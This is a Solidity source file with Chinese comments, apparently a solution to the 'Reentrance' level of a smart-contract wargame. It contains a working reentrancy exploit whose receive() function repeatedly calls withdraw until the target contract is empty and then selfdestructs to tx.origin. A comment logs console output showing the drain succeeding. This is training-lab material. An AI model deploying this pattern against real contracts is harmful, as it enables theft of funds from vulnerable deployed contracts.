// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '../../contracts/contracts/levels/Reentrance.sol';
import 'hardhat/console.sol';

contract Exploit {
    Reentrance public target;
    uint256 count;
 
    //in constructor 中，合约还没有部署好，收到ether 时，
    constructor (Reentrance _target) public payable {
        target = _target;
       // _exploit(msg.value);  
    }
    
    // 
    function exploit() public payable{
        uint256 balance = address(target).balance; 
        require(msg.value >= balance, "insufficient fund"); // 希望"1次正常进入+ 1次重入"把资金全部取出。
        _exploit(balance);
        require(address(target).balance == 0, "fail to exploit");
        selfdestruct(tx.origin);
    }

    function _exploit(uint256 _amount) internal{
        uint256 balance = address(target).balance; 
        console.log("before donate, target has %s ether", balance);

        target.donate{value:_amount}(address(this));

        balance = address(target).balance; 
        console.log("after donate, target has %s ether", balance);

        target.withdraw(_amount);  

        balance = address(target).balance; 
        console.log("after withdraw, target has %s ether", balance);

       
    }

    /*
     //在进入receive 之前，target 就已经将10 ethers 转给了exploit.
     console.log:
     before donate, target has 10000000000000000000 ether
     after donate, target has 20000000000000000000 ether
     withdraw 10000000000000000000 from 0xd9145CCE52D386f254917e481eB44e9943F39138
     exploit receive, from:0xa131AD247055FD2e2aA8b156A11bdEc81b9eAD95, value:10000000000000000000
     receive, balance:10000000000000000000, msg.value:10000000000000000000
     withdraw 10000000000000000000 from 0xd9145CCE52D386f254917e481eB44e9943F39138
     exploit receive, from:0xa131AD247055FD2e2aA8b156A11bdEc81b9eAD95, value:10000000000000000000
     receive, balance:0, msg.value:10000000000000000000
     after withdraw, target has 0 ether
    */
    receive() external payable{
        console.log("exploit receive, from:%s, value:%s", msg.sender, msg.value);
        uint256 balance = address(target).balance; 
        console.log("receive, balance:%s, msg.value:%s", balance, msg.value);
        if (balance > 0){
            target.withdraw(balance); //重入的时候，要确保withdraw的输入参数小于用户donation。
        }
    }

}
